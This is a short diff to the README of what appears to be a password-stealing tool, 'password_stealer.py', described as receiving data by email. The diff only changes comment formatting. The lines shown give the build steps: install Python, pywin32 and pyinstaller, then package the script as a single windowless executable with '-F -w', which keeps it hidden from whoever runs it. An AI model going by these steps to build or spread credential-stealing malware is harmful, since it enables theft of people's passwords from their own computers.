@@ -8,7 +8,7 @@ receive data by email
 
 download and install Python > 3.0
 
-# after install Python,open your cmd and install Dependencies
+ after install Python,open your cmd and install Dependencies
 
  pip install pywin32
 
@@ -26,7 +26,7 @@ pip install pyinstaller
 pyinstaller password_stealer.py -F -w
 
 
-# password_stealer is your file python,you can change the name
+password_stealer is your file python,you can change the name
 
 # Demo Video Youtube
 
